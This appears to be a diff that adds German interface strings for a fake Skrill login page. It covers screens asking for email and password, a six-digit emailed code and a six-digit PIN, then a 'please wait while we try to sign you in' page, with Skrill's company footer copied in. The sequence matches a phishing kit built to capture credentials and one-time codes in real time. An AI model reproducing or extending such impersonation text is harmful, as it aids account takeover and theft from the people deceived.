@@ -1,0 +1,44 @@
+{
+"main":{
+    "title":"Bei Ihrem Skrill-Konto anmelden",
+    "dont":"Sie haben noch kein Konto? ",
+    "register":"Registrieren",
+    "email":"E-mail",
+    "pass":"Passwort",
+    "button":"Anmelden",
+    "forgot":"Passwort vergessen?"
+},
+
+"email":{
+    "auth":"Authentifizierung",
+    "step":"Schritt 1 von 2",
+    "title":"Überprüfen Sie Ihre E-Mails",
+    "p1":"Ein 6-stelliger Bestätigungscode wurde an",
+    "p2":"Bitte nachstehend eingeben.",
+    "label":"Bestätigungscode *",
+    "time1":"Ihr Code bleibt ",
+    "time2":"Minuten aktiv.",
+    "code":"Neuen Code senden",
+    "button":"WEITER"
+},
+"pin":{
+    "step":"Schritt 2 von 2",
+    "title":"Bitte Ihre PIN eingeben",
+    "p1":"Geben Sie Ihre 6-stellige PIN ein, um mit der Anmeldung fortzufahren.",
+    "p2":"Was ist das?",
+    "forgot":" Auf diesem Gerät nicht mehr danach fragen",
+    "button":"ANMELDEN",
+        "label":"PIN"
+
+},
+"wait":{
+    "title":"Authentifizieren...",
+    "desc":"Bitte warten Sie, während wir versuchen, Sie anzumelden. Bitte aktualisieren Sie diese Seite nicht. Das kann ein paar minuten dauern."
+},
+"privace":{
+
+    "privacy":"Datenschutzerklärung | Hinweis zu Cookies | Cookie-Einstellungen",
+
+    "p":"Skrill Limited. Registriert in England und Wales. Firmennummer: 4260907 Hauptsitz: 27th Floor, 25 Canada Square, Canary Wharf, London, E14 5LQ, Großbritannien Skrill Limited (FRN: 900001) ist von der britischen Finanzaufsichtsbehörde (Financial Conduct Authority) als E-Money-Institut gemäß den Bestimmungen von 2011 für die Ausgabe von elektronischen Zahlungsmitteln und -instrumenten zugelassen. Skrill ist eine eingetragene Marke von Skrill Limited."
+}
+}
